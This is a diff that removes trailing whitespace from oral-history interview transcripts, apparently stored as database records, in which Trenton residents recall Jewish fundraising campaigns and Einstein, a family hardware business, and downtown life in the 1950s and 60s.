@@ -68,7 +68,7 @@ Siskowitz:(9:30)..until several years later really in 1961 even the amount that 
 
 Interviewer: that''s not bad
 
-Siskowitz: you see when we talk about the dinner [laughs] I sort of found a little note today um [shuffles paper] let''s see if I have it here [shuffles more ] (13:41-13:56) yeah so during the time when I was in 1961 the cost of the dinner was 5 dollars and 50 cents a person we had 75 people at the dinner 5.50 was a big investment today to invite people to the dinner 
+Siskowitz: you see when we talk about the dinner [laughs] I sort of found a little note today um [shuffles paper] let''s see if I have it here [shuffles more ] (13:41-13:56) yeah so during the time when I was in 1961 the cost of the dinner was 5 dollars and 50 cents a person we had 75 people at the dinner 5.50 was a big investment today to invite people to the dinner
 
 [inaudible]
 
@@ -78,7 +78,7 @@ Siskowitz:is there a ruth-ruth
 
 Interviewer: ruth
 
-Siskowitz:ruth jersey singoa 
+Siskowitz:ruth jersey singoa
 
 Interviewer: yeah
 
@@ -86,29 +86,29 @@ Interviewer:yeah oh I remember as a matter of fact I took her running pictures
 
 Siskowitz: really?
 
-Interviewer: yeah missionary stuff I didn''t approve of 
+Interviewer: yeah missionary stuff I didn''t approve of
 
 Siskowitz:right
 
 [overlapping] at the time
 
-Siskowitz: she was a dentist with not enough time in the morning she was tired [flipping pages 19:44-19:52] [mumbling 19:53-55] ''51 into the mid 60''s she continued that women''s position in 1961 she [flipping pages 20:13-20:23] ''61 did she yeah she was secretary in 1961 and I think she continued as secretary in ''62 im not sure sixty- delran daughter of 
+Siskowitz: she was a dentist with not enough time in the morning she was tired [flipping pages 19:44-19:52] [mumbling 19:53-55] ''51 into the mid 60''s she continued that women''s position in 1961 she [flipping pages 20:13-20:23] ''61 did she yeah she was secretary in 1961 and I think she continued as secretary in ''62 im not sure sixty- delran daughter of
 
-Interviewer:missioner 
+Interviewer:missioner
 
 Siskowitz:missioner man who said to dress in something beautiful at her afterwards when she was in Europe and met some very important people to come to address this community and honestly though him and her each alone were able to recognize the importance of Princeton was it was wealthy  and it was a land of cooperation and when I went into the service there were letters from the destinations at the time and each time I took a treasurership or chairmanship while I was receiving a very nice letter from the head office ... with cooperation a lot of good help so it wasn''t a job that pertained by any one person it was a cooperative organization
 
 Interviewer: how was albert einstein''s influence in-
 
-Interviewer: he was he was very cooperative he attended all of our meetings he came here when I had meeting with the board he was he signed all of my letters that I sent all up to the day he died he sent out a letter to the christian committee different people asking him to serve with the committee that I had proposed at that time 
+Interviewer: he was he was very cooperative he attended all of our meetings he came here when I had meeting with the board he was he signed all of my letters that I sent all up to the day he died he sent out a letter to the christian committee different people asking him to serve with the committee that I had proposed at that time
 
 Siskowitz: did you vote him in the office?
 
-Interviewer: he was almost he was I would say honorary chairman in every campaign we had we had him as our honorary chairman we had a professor lowe who was a very well renowned individual who served with me for several years as for a couple years as co chairman professor kadowski served with me for a couple of years as co chairman wherever he was and so basically for a joint study was a very important part of our campaign the influence of einstein and these professors they affect professor lowe used to give me the names of all those who have come over and in December I would stick around to contact these people for donations every time I spent money ....at that tim I can tell if you''re interested to know the .... that''s of course another stay the wonderful things about professor einstein the different things there was example through sight this one example was about professor einstein I was in his home because I had to get his signature on the letters I was sending back to his community he was in a conference with two other professors and the problems they were having and so I separated it was very interesting to do to be sitting there and directing the discussion but a group of young men came to the door unannounced without appointment asking to see professor einstein and ms. dickens who was the secretary at the time told them that he was occupied that he couldn''t possibly see anyone without an appointment and they were quick insistent and he heard the commotion and he collective sat up what is the problem so ms. dickens explained to him these people came from english I think it was they were having a group forming to have invited different important people to address the incident and this is the farm area in...i think it was at that time and he was like wow look at the young people bringing in and he went to the door and looked at the lady and expected him a purpose why wasn''t he they wanted him to come to address them and he appreciated the invitation so much and praised them highly for their efforts that they were making in their um [inaudible] young people mostly and but that he wasn''t already in a position to do that and even every interviews that he was having they were bringing the cameras in television at that time already to his home and in fact even when he was here one time when I was having a table spread for after the meeting he couldn''t attempt to participate in that part but at that time the way he praised them I felt as if it was a rabbi talking to his students [laughter] and and encouraged them to continue with that so smiley so he was admirable he was left aloof he was a he treated everyone really now he was in my town take with him I felt an ... basis with him because that is the way he treated me if he got a letter from someone from his uncle he would call or have his ms.dickens call me to discuss certain things so he was definitely a very fine young boy he couldn''t aside from being a professor he was to a degree a shy person that may seem when he was here and I had the table against the door because I had chairs all over the place and when he was ready to leave we were seeing the discussion room standing above several recent situations and when he was ready to leave I had we had to move the closet and he thought he could go out the other way in my head closed off you still have an opening that other closet that was the he was embarrassed by the fact that he to go out before everyone else you believe and when I told him I had the broke face? and he had to come through the door he was really embarrassed by it but aside from so many other things at one time and by the enthusiasm at the meeting at the public meeting that was at... I was tearing the paper read making every effort to contact every Jew possible and even everyone suspected to be a Jew [laughter] at least we did he pulled my sleeve turned to me and he said they''re just like the Nazi''s [laughter] the way he snapped [inaudible mumbling with laughter] but the fact of the matter is that in those days we did contact everyone that possible could we left no one to go without a contribution this is something that I don''t any federation had every succeeded in doing and i''ve seen publications of the Jewish federation and they used to post the different contributions and it was shameful to see that so many contributions were in the 10 15 20 dollar range but just working people too so many business people that was shameful to even publish it was to date expect in 1970 we never published the amounts anyone gave but in 1970 the professor linkton ran the campaign and he published not individual but in classes listing those over 2000 those at that time that was already related to that class and over 1000 in those in between 500 and 1000 and between 250 and 500 and so on and listed those under 35 and when I read the names I was sick because I felt that was a terrible thing to do if these people couldn''t afford to give at that time they shouldn''t be publicized 
+Interviewer: he was almost he was I would say honorary chairman in every campaign we had we had him as our honorary chairman we had a professor lowe who was a very well renowned individual who served with me for several years as for a couple years as co chairman professor kadowski served with me for a couple of years as co chairman wherever he was and so basically for a joint study was a very important part of our campaign the influence of einstein and these professors they affect professor lowe used to give me the names of all those who have come over and in December I would stick around to contact these people for donations every time I spent money ....at that tim I can tell if you''re interested to know the .... that''s of course another stay the wonderful things about professor einstein the different things there was example through sight this one example was about professor einstein I was in his home because I had to get his signature on the letters I was sending back to his community he was in a conference with two other professors and the problems they were having and so I separated it was very interesting to do to be sitting there and directing the discussion but a group of young men came to the door unannounced without appointment asking to see professor einstein and ms. dickens who was the secretary at the time told them that he was occupied that he couldn''t possibly see anyone without an appointment and they were quick insistent and he heard the commotion and he collective sat up what is the problem so ms. dickens explained to him these people came from english I think it was they were having a group forming to have invited different important people to address the incident and this is the farm area in...i think it was at that time and he was like wow look at the young people bringing in and he went to the door and looked at the lady and expected him a purpose why wasn''t he they wanted him to come to address them and he appreciated the invitation so much and praised them highly for their efforts that they were making in their um [inaudible] young people mostly and but that he wasn''t already in a position to do that and even every interviews that he was having they were bringing the cameras in television at that time already to his home and in fact even when he was here one time when I was having a table spread for after the meeting he couldn''t attempt to participate in that part but at that time the way he praised them I felt as if it was a rabbi talking to his students [laughter] and and encouraged them to continue with that so smiley so he was admirable he was left aloof he was a he treated everyone really now he was in my town take with him I felt an ... basis with him because that is the way he treated me if he got a letter from someone from his uncle he would call or have his ms.dickens call me to discuss certain things so he was definitely a very fine young boy he couldn''t aside from being a professor he was to a degree a shy person that may seem when he was here and I had the table against the door because I had chairs all over the place and when he was ready to leave we were seeing the discussion room standing above several recent situations and when he was ready to leave I had we had to move the closet and he thought he could go out the other way in my head closed off you still have an opening that other closet that was the he was embarrassed by the fact that he to go out before everyone else you believe and when I told him I had the broke face? and he had to come through the door he was really embarrassed by it but aside from so many other things at one time and by the enthusiasm at the meeting at the public meeting that was at... I was tearing the paper read making every effort to contact every Jew possible and even everyone suspected to be a Jew [laughter] at least we did he pulled my sleeve turned to me and he said they''re just like the Nazi''s [laughter] the way he snapped [inaudible mumbling with laughter] but the fact of the matter is that in those days we did contact everyone that possible could we left no one to go without a contribution this is something that I don''t any federation had every succeeded in doing and i''ve seen publications of the Jewish federation and they used to post the different contributions and it was shameful to see that so many contributions were in the 10 15 20 dollar range but just working people too so many business people that was shameful to even publish it was to date expect in 1970 we never published the amounts anyone gave but in 1970 the professor linkton ran the campaign and he published not individual but in classes listing those over 2000 those at that time that was already related to that class and over 1000 in those in between 500 and 1000 and between 250 and 500 and so on and listed those under 35 and when I read the names I was sick because I felt that was a terrible thing to do if these people couldn''t afford to give at that time they shouldn''t be publicized
 
-[inaudible interviewer comment] 
+[inaudible interviewer comment]
 
-Siskowitz: I felt very strongly about that also of course I saw names of others that should able to help more of course in 1970 the ... sucks it was not existing doesn''t resonate like the 40''s or 50''s you see so I was always against this idea of publishing because people are giving in accordance to their what their heart permits then we tax ourselves and I always felt that women could do a usual rate is a tax that we put on ourselves that is important tax to take care of our own to take care of those who need help and without the help that Israel standing leads to the disparity today we still have problems but we also have problems individually that have to be taken care of and if we don''t have a Jewish community established locally we will never be ready to have those overseas 
+Siskowitz: I felt very strongly about that also of course I saw names of others that should able to help more of course in 1970 the ... sucks it was not existing doesn''t resonate like the 40''s or 50''s you see so I was always against this idea of publishing because people are giving in accordance to their what their heart permits then we tax ourselves and I always felt that women could do a usual rate is a tax that we put on ourselves that is important tax to take care of our own to take care of those who need help and without the help that Israel standing leads to the disparity today we still have problems but we also have problems individually that have to be taken care of and if we don''t have a Jewish community established locally we will never be ready to have those overseas
 
 Interviewer: true
 
@@ -136,7 +136,7 @@ Siskowitz: and a member of senators where calling him to get his opinion on it a
 
 Interviewer: true
 
-Siskowitz:even though they were Christian, brought up as Christians, but they still had the feeling yeah of one particular case who would not make his contribution that one particular year because he joined this abusive community and they never Palestine appeal couldn''t agree on the percentage of take when we joined as a joined the group we were already running in the campaign before the ... came up to the settlement and he was at the time felt very strongly remorse for the joined this abusive community he was extra impact Palestine appeal itself and since it was impacted by Palestine we gotten to quite a discussion about it and in the discussion he said well I''m not Jewish I''m Christian my wife my brother was Christian I was brought up as a Christian my wife was Christian [inaudible] my father today was taken disinterest of course at that time they never considered him chairman you see and this I said to him I can''t seem to remember his name it was a real Jewish name actually and I said no we''re not doing it in honor of to honor your father we''re doing it because you have your father''s heart, you have a Jewish heart we take care of our Jews and he looked at me at the time and of course even through the discussion we were having about Palestine I believe I convinced him that it was important that we should have a piece of land where we could unite and if and get the people all these refugees that ...and I would stay true and accept during those days and in fact I got a larger contribution from the the morning gift of a long discussion was a big contributer but when I mentioned about the Jewish heart 
+Siskowitz:even though they were Christian, brought up as Christians, but they still had the feeling yeah of one particular case who would not make his contribution that one particular year because he joined this abusive community and they never Palestine appeal couldn''t agree on the percentage of take when we joined as a joined the group we were already running in the campaign before the ... came up to the settlement and he was at the time felt very strongly remorse for the joined this abusive community he was extra impact Palestine appeal itself and since it was impacted by Palestine we gotten to quite a discussion about it and in the discussion he said well I''m not Jewish I''m Christian my wife my brother was Christian I was brought up as a Christian my wife was Christian [inaudible] my father today was taken disinterest of course at that time they never considered him chairman you see and this I said to him I can''t seem to remember his name it was a real Jewish name actually and I said no we''re not doing it in honor of to honor your father we''re doing it because you have your father''s heart, you have a Jewish heart we take care of our Jews and he looked at me at the time and of course even through the discussion we were having about Palestine I believe I convinced him that it was important that we should have a piece of land where we could unite and if and get the people all these refugees that ...and I would stay true and accept during those days and in fact I got a larger contribution from the the morning gift of a long discussion was a big contributer but when I mentioned about the Jewish heart
 
 [inaudible]
 
@@ -152,7 +152,7 @@ Siskowitz: well what could I tell you
 
 Interviewer: when you were smaller I mean how close were you-
 
-Siskowitz: we were a very close family very close we were a very close family in before we came here like I said my father died when I was about eight years old and that was a direct result of the first world war so we all worked together very closely we all cooperated with everything very closely and when we came here my two sisters the oldest sisters went to work with me i think my younger sister who was only sixteen at that time she took complete control over the store she picked up the English language in no time simply went to night school short time she was very capable individual wonderful person let''s say I was very close with her and after school I was 
+Siskowitz: we were a very close family very close we were a very close family in before we came here like I said my father died when I was about eight years old and that was a direct result of the first world war so we all worked together very closely we all cooperated with everything very closely and when we came here my two sisters the oldest sisters went to work with me i think my younger sister who was only sixteen at that time she took complete control over the store she picked up the English language in no time simply went to night school short time she was very capable individual wonderful person let''s say I was very close with her and after school I was
 
 Interviewer: what was what was your sisters name who''s sydney grosses sitting her grosses mother
 
@@ -160,25 +160,25 @@ Siskowitz: lina
 
 Interviewer:lina?
 
-Siskowitz: yeah 
+Siskowitz: yeah
 
 Interviewer: was she with you
 
 Siskowitz: she was the next oldest
 
-Interviewer: thirsty 
+Interviewer: thirsty
 
 Siskowitz: I had a brother who was left in Europe he left when the war started in 1914 the school gave him a complete scholarship and they moved out to deep Russia I think it was what would we call it that was the landing..... it was eighteen he had to the school moved up and him he went from the school and he was left-
 
 [inaudible overlap]..St. Petersburg wasn''t it
 
-Siskowitz:that was after that they named the 
+Siskowitz:that was after that they named the
 
-Interviewer: Purtrugra? 
+Interviewer: Purtrugra?
 
 [inaudible laughter]
 
-Interviewer:I heard you change it 
+Interviewer:I heard you change it
 
 Siskowitz: yeah [laughter] but ..went with the school and he only came once for a visit during the war and my father and I can recall this so vividly was at all prepared one year to go visit him he got the passport he got the everything ready and something came up and I don''t know exactly what he wasn''t able to aboard it they didn''t permit
 
@@ -201,7 +201,7 @@ Siskowitz: yeah [laughter] but ..went with the school and he only came once for 
 
 
 
-SIDE B: 
+SIDE B:
 
 Siskowitz: and in the when we came here in 1921 because we were always in East Slovakia and we went to Reagan where I had an uncle there who later came here after us as well in 1921 we got a letter from my brother we had left our address with the Red Cross at the time when we were locating one of the other families and he was able to get the address that way and wrote a letter at the time he was still in the army he was a commander of engineers he was an engineer at the time and of course he was hoping that someday we would able to be together he was a when we got believe it another letter from him in fact Liam wrote to him a couple of time and then he got the response eventually and under the Stallon situation he was one of the people obviously that was eliminated among many others when Stallon started this business
 
@@ -209,7 +209,7 @@ Interviewer: Now one of one of Liam''s daughters is the head nurse at Greenwood'
 
 Siskowitz:I don''t know if she''s the head nurse but she''s there
 
-Interviewer: What was her name? [overlapping] Aileen 
+Interviewer: What was her name? [overlapping] Aileen
 
 Siskowitz: Aileen Burkman
 
@@ -239,25 +239,25 @@ Siskowitz: He''s older
 
 Interviewer: And your your one was in the army in Russia
 
-Siskowitz: He was 
+Siskowitz: He was
 
-Interviewer: was he 
+Interviewer: was he
 
 Siskowitz: the second one in the family
 
 Interviewer: Okay
 
-Siskowitz: Jean Failman was the oldest and then my brother Theya he was second and then Liam and then Anna and there was another child that died before I knew anything about it and then Liana and then I''m the baby of the family so 
+Siskowitz: Jean Failman was the oldest and then my brother Theya he was second and then Liam and then Anna and there was another child that died before I knew anything about it and then Liana and then I''m the baby of the family so
 
 Interviewer: That''s nice it''s a nice close family
 
-Siskowitz: Very close very close we were we were a singing family actually at that time we didn''t have radios and TV''s and we all enjoyed the singing 
+Siskowitz: Very close very close we were we were a singing family actually at that time we didn''t have radios and TV''s and we all enjoyed the singing
 
 Interviewer: What I''d like to do is I''d like to borrow this and as I write this I can refer to some of these things with the dates that you were saying and I''ll get them back to you
 
 Siskowitz: I appreciate that
 
-  
+
 
 
 ', 'Initial transcript', 't');
@@ -275,7 +275,7 @@ JOEL MILLNER [interrupting]: Yeah, well that was it, it was August 25th uh—
 
 INTERVIEWER [interrupting]: Okay 1994, so [indistinguishable] okay, alright, and where was, where was he born?
 
-JOEL MILLNER: He was born in, uh, in, um, Vilna 
+JOEL MILLNER: He was born in, uh, in, um, Vilna
 
 INTERVIEWER: Vilna, that was, that was probably in Poland at that time.
 
@@ -323,7 +323,7 @@ JOEL MILLNER: Yeah, I don’t know who, the, uh, the father was but, uh, you kno
 
 INTERVIEWER [interrupting]:O—Okay, now I have something here that I heard somewhere that he sold uh, writing papers and pens and needles, was it, did he do that while he was here in Trenton, in the Trenton Area?
 
-JOEL MILLNER: Yeah, I—I don’t think, uh, he, ya know, he was a uh, peddler 
+JOEL MILLNER: Yeah, I—I don’t think, uh, he, ya know, he was a uh, peddler
 
 INTERVIEWER: okay
 
@@ -339,7 +339,7 @@ JOEL MILLNER: Yeah, yeah, but he happened to be a very good, uh, a very good [6:
 
 INTERVIEWER [interrupting]: Well, they always, they always uh, cut the pile,, the house always cut the pile, so.
 
-JOEL MILLNER [overlapping]: Did they really? 
+JOEL MILLNER [overlapping]: Did they really?
 INTERVIEWER: Yeah. Okay now, uh, there was a hardware store in Trenton, uh, it says five years, [indistinguishable] owned a, owned a, he had a hardware store
 
 JOEL MILLNER: Well yeah, yeah, I guess he was on broad street, he had a, uh, houseware store, and—
@@ -430,11 +430,11 @@ INTERVIEWER: Albany.
 
 JOEL MILLNER: Was it Albany? Yeah uh, that was an 18 year span, you know, that uh, he, uh, was here and there and uh [17:00] he was a bachelor uh, you know, uh
 
-INTERVIEWER: Okay, then there was something about he worked for Erkin and Kahn on Perry Street, when it was on Perry Street, right on the corner of Perry and Broad, is that where [indistinguishable] had his place there, is that? 
+INTERVIEWER: Okay, then there was something about he worked for Erkin and Kahn on Perry Street, when it was on Perry Street, right on the corner of Perry and Broad, is that where [indistinguishable] had his place there, is that?
 
 JOEL MILLNER: Erkin and Kahn, yeah
 
-INTERVIEWER: Was that where it was? ‘Cause I know Erkin and Kahn was out on Clinton avenue for… 
+INTERVIEWER: Was that where it was? ‘Cause I know Erkin and Kahn was out on Clinton avenue for…
 
 JOEL MILLNER: Yeah, but, uh, well I don''t uh, I don’t remember uh, uh, I don’t remember that
 
@@ -462,7 +462,7 @@ INTERVIEWER: Okay, okay, alright thats, thats all  I—
 
 JOEL MILLNER: Yeah.
 
-INTERVIEWER: Okay, okay, now one thing that I, uh, you know, thought was a—a tremendous thing was he ordered a car load of nails? What—what was that story he was tellin? He ordered a car load of nails, and, uh, in kegs and then went out and peddled them all? 
+INTERVIEWER: Okay, okay, now one thing that I, uh, you know, thought was a—a tremendous thing was he ordered a car load of nails? What—what was that story he was tellin? He ordered a car load of nails, and, uh, in kegs and then went out and peddled them all?
 JOEL MILLNER: Well, that waswhat he did, you know, [19:00] uh, uh, you know he would buy and, and—
 
 INTERVIEWER: Well what got him into the wholesale business? He didn''t want to work with the Millners anymore—I mean with the uh?
@@ -521,7 +521,7 @@ INTERVIEWER: Was your sister active at all here?
 
 JOEL MILLNER: My sister was never, never, never worked here,my brother and I you know, started working here uh, when we were twelve years old. That’s why I tell people I‘ve been working around here 55 years uh
 
-INTERVIEWER: That’s when we all started, about that age. 
+INTERVIEWER: That’s when we all started, about that age.
 
 JOEL MILLNER: Yeah [laughing], you know, uh, uh and, in those days it was uh, [25:00] hard work you know, they didn’t have the mechanical equipment that they have today, you know, for unloading, and we used to get up, uh, you know, come to work 6 o’clock in the morning and sometimes work ‘til 6:30,7:00 at night, you know, was, uh, stuff had to be, uh, loaded and shipped and what not, uh
 
@@ -543,7 +543,7 @@ JOEL MILLNER: Yea, yeah, no [29:00] I don’t believe we have any pictures of th
 
 INTERVIEWER: So, when did your dad actually retire from here and went to Florida, and didn’t, and didn’t—
 
-JOEL MILLNER [interrupting]: Well, I don''t think he ever really retired, you know, uh, uh, I, you know, when we came into the business, and—and probably wrongly so, in 1952, you know, we were both here, when I was at—finished college, [indistinguishable] was here uh, you know, while I was in, in college, and he decided he didn’t want to go to college, er uh, and, uh, my father pretty much backed off, you know, from uh, being an active participant, he wanted to be a participant, but uh he, he, he, he didn''t want the, the daily uhh, problems, that uh, ya know, the servicing the customers uh, that uh, that uh, were required, ya know. [30:00] I mean, he wanted to make the decisions, but he wasn''t around, you know, to uh, to uh, to make the decisions, and uh, we found it necessary to make the decisions, and then have him, you know, uh, uh, say well you shouldn''t have done this or you shouldn''t of done that. Well, listen we had to make a decision and that''s the decision we, you know, we, we, we made, uh, you know, if you wanna, if you''re here then we’ll consult you, but if you’re not here i feel you have to give us the, uh that we’re, we’re attempting to do the best job possible, but, you know. So that’s when uh, uh, he sort of backed off and then I think he was, when he moved to Florida uh, he was 84 years old, so he lived in Florida almost 20 years, uh, I—I think, uh, into his 90s [31:00] he came back and he had the home on uh, on Bellevue Avenue and he, he had a place to stay, and after that, he uh, he came, after he sold the house he came back, but, but less uh, frequently, because then he would stay with a friend, uh, Andrew Repaul, and, uh, occasionally he would stay with us, but I don''t think he was comfortable staying with us, you know, because you’re always, you’re not home, you’re going, you’re coming, you know, I don’t know, I can’t eat the hours that you guys eat, you know, and uh, and uh, and then he, uh, and then he stayed with a fellow by the name of Lou Bellanchio, that had, uh, uh, that had a furniture factory, that, that he was manufacturing furniture, [32:00] uh, sofa beds. Uh, do you remember he, uh, well originally he was on, uh, I—I guess he, he was, he manufactured in the old Skillman building— 
+JOEL MILLNER [interrupting]: Well, I don''t think he ever really retired, you know, uh, uh, I, you know, when we came into the business, and—and probably wrongly so, in 1952, you know, we were both here, when I was at—finished college, [indistinguishable] was here uh, you know, while I was in, in college, and he decided he didn’t want to go to college, er uh, and, uh, my father pretty much backed off, you know, from uh, being an active participant, he wanted to be a participant, but uh he, he, he, he didn''t want the, the daily uhh, problems, that uh, ya know, the servicing the customers uh, that uh, that uh, were required, ya know. [30:00] I mean, he wanted to make the decisions, but he wasn''t around, you know, to uh, to uh, to make the decisions, and uh, we found it necessary to make the decisions, and then have him, you know, uh, uh, say well you shouldn''t have done this or you shouldn''t of done that. Well, listen we had to make a decision and that''s the decision we, you know, we, we, we made, uh, you know, if you wanna, if you''re here then we’ll consult you, but if you’re not here i feel you have to give us the, uh that we’re, we’re attempting to do the best job possible, but, you know. So that’s when uh, uh, he sort of backed off and then I think he was, when he moved to Florida uh, he was 84 years old, so he lived in Florida almost 20 years, uh, I—I think, uh, into his 90s [31:00] he came back and he had the home on uh, on Bellevue Avenue and he, he had a place to stay, and after that, he uh, he came, after he sold the house he came back, but, but less uh, frequently, because then he would stay with a friend, uh, Andrew Repaul, and, uh, occasionally he would stay with us, but I don''t think he was comfortable staying with us, you know, because you’re always, you’re not home, you’re going, you’re coming, you know, I don’t know, I can’t eat the hours that you guys eat, you know, and uh, and uh, and then he, uh, and then he stayed with a fellow by the name of Lou Bellanchio, that had, uh, uh, that had a furniture factory, that, that he was manufacturing furniture, [32:00] uh, sofa beds. Uh, do you remember he, uh, well originally he was on, uh, I—I guess he, he was, he manufactured in the old Skillman building—
 
 INTERVIEWER: Oh yeah, yeah.
 
@@ -560,14 +560,14 @@ JOEL MILLNER: No, that was, uh, that was the, uh,  uh, Johnson Oldsmobile.
 INTERVIEWER: Well, wasn’t Stanley Products in there?
 
 JOEL MILLNER: Well, Stanley Products moved in after Johnson left.P
-INTERVIEWER: okay, alright. 
+INTERVIEWER: okay, alright.
 
-JOEL MILLNER: You know, [33:00] and then the bank took it over, ya know, and, and we were probably uhh, uh, negligent in, in not attempting to, to buy that and, and utilizing that as a front, storefront with the yard in the, in the, in the back, but, you know, we had so much space here that, uh, and, uh, it wasn''t as important to, uh, uh, t—to be uh, fronting on Hermitage Avenue, uh, at the point in time, you know, or we could, uh, have acquired, uh there was a gas station o—on the corner here uh, you know, and then the bank, uh, put a little branch in th—in there and uh, between the gas station and our property. 
+JOEL MILLNER: You know, [33:00] and then the bank took it over, ya know, and, and we were probably uhh, uh, negligent in, in not attempting to, to buy that and, and utilizing that as a front, storefront with the yard in the, in the, in the back, but, you know, we had so much space here that, uh, and, uh, it wasn''t as important to, uh, uh, t—to be uh, fronting on Hermitage Avenue, uh, at the point in time, you know, or we could, uh, have acquired, uh there was a gas station o—on the corner here uh, you know, and then the bank, uh, put a little branch in th—in there and uh, between the gas station and our property.
 
-INTERVIEWER: That was, that was Gale, over that gas station, didn’t he—guy by name of Gale? He had a Pontiac [indistinguishable]  
+INTERVIEWER: That was, that was Gale, over that gas station, didn’t he—guy by name of Gale? He had a Pontiac [indistinguishable]
 JOEL MILLNER [interrupting]: It could be,  I never noti—
 
-INTERVIEWER [Continuing]: [Indistinguishable] Young fella, I remember a guy, it was a young fella. 
+INTERVIEWER [Continuing]: [Indistinguishable] Young fella, I remember a guy, it was a young fella.
 
 JOEL MILLNER: Well, who was that, [34:00] I thought it was—the one guy that had it was by the name of Alan, wasn’t it?Uh, I don’t remember his first name—
 
@@ -722,7 +722,7 @@ BRENDA: I might have been five years old but I went to these movies.
 INTERVIEWER: Uh huh.
 BRENDA: Maybe I didn’t maybe I didn’t go when I was five. Maybe I went like nine and ten.
 INTERVIEWER: Uh huh.
-BRENDA: But yeah. 
+BRENDA: But yeah.
 INTERVIEWER: Yeah?
 BRENDA: And ya know I remember that. Yeah the Capitol.
 INTERVIEWER: Can you tell me anything  more about these photos that.
@@ -738,7 +738,7 @@ BRENDA: Oh they were in ‘54 I do remember. I do remember. Aw y’all went to t
 INTERVIEWER: Yep. This one was taken after an air raid drill. Do you remember?
 BRENDA: Ah nobody was downtown. I don’t remember that no.
 INTERVIEWER: This is the Mayfair Theater.
-BRENDA: Oh I remember the Mayfair. Yep. 
+BRENDA: Oh I remember the Mayfair. Yep.
 INTERVIEWER: Do you remember seeing shows there?
 BRENDA: Yeah we used to go there and and there was the Trent Theater downtown also.
 INTERVIEWER: Mmhm.
@@ -758,7 +758,7 @@ BRENDA: We’d watch one movie all day long didn’t we? Stay in there all day. 
 INTERVIEWER: They kick you out now?
 BRENDA: We’d go to the movies and stay all day long. Mom didn’t have to worry about oh look this snow.
 INTERVIEWER: Do you remember the snow? We had a lot of pictures of this.
-BRENDA: Oh yeah. What’s this 1960? 
+BRENDA: Oh yeah. What’s this 1960?
 INTERVIEWER: Yeah.
 BRENDA: That big snow?
 INTERVIEWER: There’s. Woolworth should be in that picture.
@@ -780,10 +780,10 @@ BRENDA: Uh huh. This is still it’s still on Broad and State. He still on he he
 INTERVIEWER: Really?
 BRENDA: Always. Downtown with State always stayed (?). And Dunkin Donuts is over here now. And and up there is the um uh army where they trained the young boys to get in service. What?
 INTERVIEWER: (?) you mentioned there were like ethnic parades and stuff.
-BRENDA: Yeah. They always had parades. Yeah we always had parades. (?). What? Those some good pictures aha. I remember them but you know what? Really(?) see all these people downtown? We um we didn’t go downtown that much only to the movies. 
+BRENDA: Yeah. They always had parades. Yeah we always had parades. (?). What? Those some good pictures aha. I remember them but you know what? Really(?) see all these people downtown? We um we didn’t go downtown that much only to the movies.
 INTERVIEWER: Mmhm.
 BRENDA: And then when we do go down to the movie downtown we were with our parents and we just go shopping and come back home that’s all.
-INTERVIEWER:Mmm. 
+INTERVIEWER:Mmm.
 BRENDA: But now everybody hang downtown.
 INTERVIEWER: But then uh when you were older did you end up going on your own?
 BRENDA: Oh yeah yeah when I got older yeah. Go down there and stay a long time.
@@ -814,7 +814,7 @@ BRENDA: Yeah. All all our things have been taken away from us and we have nothin
 INTERVIEWER: Mmm.
 BRENDA: We have nothing for our kids here. Nothing. Well I’m I’m just glad I lived in that era because I had a good time.
 INTERVIEWER: Yeah it looked like it would be a good time.
-BRENDA: Yeah it was. It was nice and (?). You you didn’t have to worry ‘bout nothing. Everybody spoke to everybody. There was no cover fee. 
+BRENDA: Yeah it was. It was nice and (?). You you didn’t have to worry ‘bout nothing. Everybody spoke to everybody. There was no cover fee.
 INTERVIEWER: Mmm.
 BRENDA:We were all people.
 INTERVIEWER: Mmhm.
@@ -874,7 +874,7 @@ BRENDA: And we’re the capital city.
 INTERVIEWER: Right.
 BRENDA: So that’s what I’m talking about.
 INTERVIEWER: So have you lived here all your life? Uh what made you stay? You obviously like the area. You have good memories of it.
-BRENDA: Uh no. This what happened. I left. When my son got eighteen he left. 
+BRENDA: Uh no. This what happened. I left. When my son got eighteen he left.
 INTERVIEWER: OK.
 BRENDA: I moved to California for like three years.
 INTERVIEWER: OK.
@@ -902,7 +902,7 @@ BRENDA: Trenton was jamming. Whatchu talking about?
 INTERVIEWER: Yeah.
 BRENDA: Yeah.
 INTERVIEWER: We looked at these pictures and it looked like uh it looked like Manhattan.
-BRENDA: And New York yeah. 
+BRENDA: And New York yeah.
 INTERVIEWER: Mmhm.
 BRENDA: Trenton is the bomb. Uh huh yeah we had a good time. I enjoy it here.
 INTERVIEWER: Yeah.
@@ -918,7 +918,7 @@ BRENDA: What you mean? There’s nothing here in Trenton. What? This my home. Wh
 INTERVIEWER: Yeah yeah.
 BRENDA: I ain’t going. I’ll leave but I’m always coming back.
 INTERVIEWER: Mmhm.
-BRENDA: And I’ve been here ever since. I think it was. I came back home ‘bout ten to fifteen years ago and I ain’t never going. 
+BRENDA: And I’ve been here ever since. I think it was. I came back home ‘bout ten to fifteen years ago and I ain’t never going.
 INTERVIEWER: Mmm.
 BRENDA: I ain’t going nowhere. Mmhm. (?)
 INTERVIEWER: Um we’re also interested in where you think Trenton will head into the future. Uh after spending so much time in it.
@@ -1002,7 +1002,7 @@ BRENDA: No I never thought Trenton would go down like this. Never but you know i
 INTERVIEWER: Right.
 BRENDA: (?) (?) (?). Yeah.
 INTERVIEWER: Yeah it’s interesting.
-BRENDA: Yeah so um and besides uh (?), my kids, my son and my grandkids are grown adults. Because I woudn’t live here with them. Uh I would move. I would probably move with my sister or something because it it’s not it’s no place to to raise. There’s no role models. There’s nothing you know? There’s nothing but destruction evil things. And the peer pressure this this time is bad because of the drugs. 
+BRENDA: Yeah so um and besides uh (?), my kids, my son and my grandkids are grown adults. Because I woudn’t live here with them. Uh I would move. I would probably move with my sister or something because it it’s not it’s no place to to raise. There’s no role models. There’s nothing you know? There’s nothing but destruction evil things. And the peer pressure this this time is bad because of the drugs.
 INTERVIEWER: Hmm.
 BRENDA: So you know I wouldn’t I wouldn’t.
 INTERVIEWER: Do you remember there being gangs in the in the between ‘45 and ‘665?
@@ -1071,7 +1071,7 @@ Siskowitz:(9:30)..until several years later really in 1961 even the amount that 
 
 Interviewer: that''s not bad
 
-Siskowitz: you see when we talk about the dinner [laughs] I sort of found a little note today um [shuffles paper] let''s see if I have it here [shuffles more ] (13:41-13:56) yeah so during the time when I was in 1961 the cost of the dinner was 5 dollars and 50 cents a person we had 75 people at the dinner 5.50 was a big investment today to invite people to the dinner 
